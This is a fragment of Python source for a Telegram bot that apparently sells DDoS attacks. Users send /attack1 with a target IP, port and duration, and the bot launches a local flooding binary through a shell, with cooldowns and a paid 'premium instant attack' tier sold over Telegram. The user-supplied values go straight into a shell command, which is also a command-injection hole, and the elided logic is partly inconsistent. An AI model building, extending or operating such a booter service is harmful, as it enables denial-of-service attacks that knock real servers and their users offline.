...
def get_inline_keyboard():
    ...
    button1 = InlineKeyboardButton("🔰 ᑕOᑎTᗩᑕT OᑎᑎEᖇ 🔰", url="https://t.me/+03wLVBPurPk2NWRl")
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown. Please Wait 150 sec Before Running The /attack1 Command Again buy premium instant attack with zero sec dm @GODxAloneBOY."
                bot.reply_to(message, response, reply_markup=get_inline_keyboard())
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./@GODxAlone {target} {port} {time} 400"
                subprocess.run(full_command, shell=True)
                response = f"🍀 ᗪᗪOS ᑌSEᖇ\n\n💣 ᗩTTᗩᑕK ᖴIᑎISᕼEᗪ 💣\n\nDM :- @GODxAloneBOY"
        else:
            response = "⚠️iᑎᐯᗩᒪIᗪ\n\n E᙭ᗩᗰᑭᒪE: /attack1 <ɪᴘ> <ᴘᴏʀᴛ>"
    else:
...
📩 <a href="https://t.me/+03wLVBPurPk2NWRl">Contact Owner</a> 💥
'''
